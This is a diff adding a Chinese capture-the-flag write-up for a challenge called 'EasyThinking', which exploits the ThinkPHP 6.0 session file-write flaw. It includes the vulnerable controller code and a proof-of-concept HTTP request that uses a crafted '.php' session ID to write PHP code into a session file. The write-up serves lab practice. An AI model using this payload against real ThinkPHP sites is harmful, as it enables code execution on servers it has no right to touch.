@@ -605,3 +605,103 @@ print(r.text)
 ```
 
 执行后pug文件就上传到template文件夹里并且读取了flag.txt
+
+## EasyThinking
+
+题目提示search功能有漏洞
+
+存在源码泄露拿到``www.zip``
+
+Thinkphp6.0框架，看下search部分逻辑
+
+```php
+//\app\home\controller\member.php
+    public function search()
+    {
+        if (Request::isPost()){
+            if (!session('?UID'))
+            {
+                return redirect('/home/member/login');            
+            }
+            $data = input("post.");
+            $record = session("Record");
+            if (!session("Record"))
+            {
+                session("Record",$data["key"]);
+            }
+            else
+            {
+                $recordArr = explode(",",$record);
+                $recordLen = sizeof($recordArr);
+                if ($recordLen >= 3){
+                    array_shift($recordArr);
+                    session("Record",implode(",",$recordArr) . "," . $data["key"]);
+                    return View::fetch("result",["res" => "There's nothing here"]);
+                }
+
+            }
+            session("Record",$record . "," . $data["key"]);
+            return View::fetch("result",["res" => "There's nothing here"]);
+        }else{
+            return View("search");
+        }
+    }
+```
+
+这里涉及到对Session的处理,最外层包装如下
+
+```php
+   function session($name = '', $value = '')
+    {
+        if (is_null($name)) {
+            // 清除
+            Session::clear();
+        } elseif ('' === $name) {
+            return Session::all();
+        } elseif (is_null($value)) {
+            // 删除
+            Session::delete($name);
+        } elseif ('' === $value) {
+            // 判断或获取
+            return 0 === strpos($name, '?') ? Session::has(substr($name, 1)) : Session::get($name);
+        } else {
+            // 设置
+            Session::set($name, $value);
+        }
+    }
+```
+
+利用点就是这个Session来实现任意文件操作具体原理可以参考参考资料
+
+Poc
+```
+POST /home/member/search HTTP/1.1
+Host: 7e20a6ce-de3e-465a-b62d-a02eaf89f174.node3.buuoj.cn
+Content-Length: 23
+Cache-Control: max-age=0
+Origin: http://7e20a6ce-de3e-465a-b62d-a02eaf89f174.node3.buuoj.cn
+Upgrade-Insecure-Requests: 1
+DNT: 1
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: http://7e20a6ce-de3e-465a-b62d-a02eaf89f174.node3.buuoj.cn/home/member/search
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
+Cookie: _ga=GA1.2.1470039898.1585919433; PHPSESSID=4ed89a20be1a7ec91b09e116cdc5.php
+Connection: close
+
+key=<?php phpinfo(); ?>
+```
+
+>thinkphp6 会默认在 ``/runtime/session`` 创建一个sess_xxx格式的session文件，这里的xxx就是PHPSESSID（必须是32位）,而文件的内容就是session的内容,此处可以向key里注入
+
+注意创建session的条件是要登陆成功，所以我们可以携带xxxx.php的phpsession进行登录，然后搜索注入
+
+根据phpinfo()可以看到disable了大部分函数，利用bypass disable_function的脚本绕过
+
+
+
+## 参考资料
+
+thinkPHP6 任意文件操作漏洞分析 https://paper.seebug.org/1114/
